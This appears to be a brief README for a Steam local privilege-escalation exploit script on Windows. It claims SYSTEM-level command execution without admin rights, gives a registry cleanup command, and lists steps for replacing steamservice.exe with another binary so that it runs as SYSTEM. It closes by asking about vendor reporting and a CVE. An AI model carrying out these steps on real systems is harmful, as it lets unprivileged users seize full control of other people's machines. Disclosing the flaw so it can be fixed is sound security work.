# steam_EoP.ps1
Command execution as NT_Authority\System

Works **without** admin privileges

For complete cleanup, at the end:
`regln-x64.exe -d HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Valve\Steam\Apps\PrivEsc`

# *Additional random info*
There is more blatant violation:
1. Log on as non-admin on a box with steam
2. Do not start steam or any game
3. `cat %system32%\calc.exe > %programfiles%\steam\bin\steamservice.exe`
4. Reboot
5. Log on, start steam
6. BAM! Now you have calc.exe (attempted to) run as System with highest local privileges

Have you reported this to the vendor or whatever channels are required to get a CVE?
